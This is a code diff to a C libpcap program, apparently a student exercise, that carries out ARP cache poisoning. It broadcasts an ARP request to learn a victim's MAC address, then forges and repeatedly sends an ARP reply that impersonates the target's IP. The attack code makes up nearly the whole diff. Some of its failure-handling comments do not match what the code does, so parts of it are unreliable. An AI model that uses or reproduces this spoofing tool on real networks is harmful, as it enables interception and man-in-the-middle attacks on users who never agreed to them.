@@ -41,7 +41,7 @@ int main(int argc, char* argv[])
     struct arp_packet ap;
     memset(&ap, 0, sizeof(ap));
 
-    uint8_t sender_mac[6] = {0, };  // declear to make the code simplify
+    uint8_t sender_mac[MAC_SIZE] = {0, };  // declear to make the code simplify
 
     /////////////////////////////////////////////////////////////////////
     // Get My IP
@@ -84,7 +84,9 @@ int main(int argc, char* argv[])
     // Set ARP-Request Packet
     /////////////////////////////////////////////////////////////////////
     {
-        memset(ap.e.ether_dhost, 0xFF, sizeof(ap.e.ether_dhost));
+        printf("Setting arp-request packet...\n\n");
+
+        memset(ap.e.ether_dhost, 0xFF, MAC_SIZE);
         GetSvrMacAddress(ap.e.ether_shost);
         ap.e.ether_type = htons(ETHERTYPE_ARP);
 
@@ -100,34 +102,16 @@ int main(int argc, char* argv[])
         ap.tgt_ip = inet_addr(argv[2]);             // sender's ip
     }
     {
-        printf("ARP-Broadcasting Packet\n");
-        dump((uint8_t*)&ap, sizeof(ap));
+        printf("[ARP-Broadcasting Packet]\n");
+        dump((const uint8_t*)&ap, sizeof(ap));
     }
 
     /////////////////////////////////////////////////////////////////////
-    // Send ARP-Request Packet
+    // Send ARP-Request Packet and Get Sender's MAC
     /////////////////////////////////////////////////////////////////////
     {
-        int send_cnt = 3;
+        int send_cnt = 0, send_flag = 0;
 
-        while(send_cnt-- && pcap_sendpacket(handle, (const uint8_t*)&ap, sizeof(ap)))
-        {
-            sleep(1);
-        }
-
-        if(send_cnt)
-        {
-            // return if it ended after three times of loop
-            fprintf(stderr, "couldn't send the packet\n");
-            pcap_close(handle);
-            return -1;
-        }
-    }
-
-    /////////////////////////////////////////////////////////////////////
-    // Get Sender's MAC
-    /////////////////////////////////////////////////////////////////////
-    {
         while(true)
         {
             struct pcap_pkthdr* header;
@@ -135,6 +119,23 @@ int main(int argc, char* argv[])
             int res = pcap_next_ex(handle, &header, &packet);
             if (res == 0) continue;
             if (res == -1 || res == -2) break;
+
+            if(!send_cnt)
+            {
+                printf("Broadcasting packet...\n");
+            }
+
+            // pcap_sendpacket(): return 0 if it success.
+            send_flag += pcap_sendpacket(handle, (const uint8_t*)&ap, sizeof(ap));
+            printf("send_cnt: %d, send_flag = %d\n", ++send_cnt, send_flag);
+            sleep(2);
+
+            if(send_flag)       // if it failed whole three times...
+            {
+                fprintf(stderr, "couldn't send the packet\n");
+                pcap_close(handle);
+                return -1;
+            }
 
             // check three things: my_mac == dst_mac && is_arp_reply packet && src_ip == sender_ip
             if(!memcmp(&packet[0], ap.sdr_mac, MAC_SIZE) && is_reply_arp_packet(packet)
@@ -145,33 +146,36 @@ int main(int argc, char* argv[])
                 break;
             }
         }
+        printf("\n");
     }
 
     /////////////////////////////////////////////////////////////////////
     // Print Address Info
     /////////////////////////////////////////////////////////////////////
     {
-        printf("[Address Information]");
+        printf("[Address Information]\n");
 
         printf("Sender's IP:\t");       printf("%s", argv[2]);  putchar('\n');
-        printf("Sender's MAC:\t");      print_mac(ap.tgt_mac);  putchar('\n');
+        printf("Sender's MAC:\t");      print_mac(sender_mac);  putchar('\n');
         printf("Target's IP:\t");       printf("%s", argv[3]);  putchar('\n');
         printf("Target's MAC:\t-");                             putchar('\n');
         printf("Attacker's IP:\t-");                            putchar('\n');
         printf("Attacker's MAC:\t");    print_mac(ap.sdr_mac);  putchar('\n');
+
+        printf("\n");
     }
 
     /////////////////////////////////////////////////////////////////////
     // Set Fake-ARP Packet
     /////////////////////////////////////////////////////////////////////
     {
-        memcpy(ap.e.ether_dhost, ap.tgt_mac, sizeof(ap.e.ether_dhost)); // Store sender's mac
+        memcpy(ap.e.ether_dhost, sender_mac, sizeof(ap.e.ether_dhost)); // Store sender's mac
         ap.a.ar_op  = htons(ARPOP_REPLY);                               // Change the op-code
         ap.sdr_ip = inet_addr(argv[3]);                                 // Change target's ip
-        memcpy(ap.tgt_mac, &sender_mac, MAC_SIZE);                       // Store sender's ip
+        memcpy(ap.tgt_mac, sender_mac, MAC_SIZE);                       // Store sender's ip
     }
     {
-        printf("Fake ARP Packet\n");
+        printf("[Fake ARP Packet]\n");
         dump((uint8_t*)&ap, sizeof(ap));
     }
 
@@ -179,14 +183,22 @@ int main(int argc, char* argv[])
     // Send Fake-ARP Packet
     /////////////////////////////////////////////////////////////////////
     {
-        int send_cnt = 3;
+        int send_cnt = 3, send_flag = 0;
 
-        while( send_cnt-- && pcap_sendpacket(handle, (const uint8_t*)&ap, sizeof(ap)) )
+        printf("Sending fake arp packet...\n");
+
+        do
         {
-            sleep(1);
-        }
+            // pcap_sendpacket(): return 0 if it success.
+            send_flag += pcap_sendpacket(handle, (const uint8_t*)&ap, sizeof(ap));
+            printf("send_cnt: %d, send_flag = %d\n", send_cnt, send_flag);
 
-        if(send_cnt)
+            sleep(2);
+        } while(--send_cnt);
+
+        printf("\n");
+
+        if(!send_cnt && send_flag)       // if it failed whole three times...
         {
             fprintf(stderr, "couldn't send the packet\n");
             pcap_close(handle);
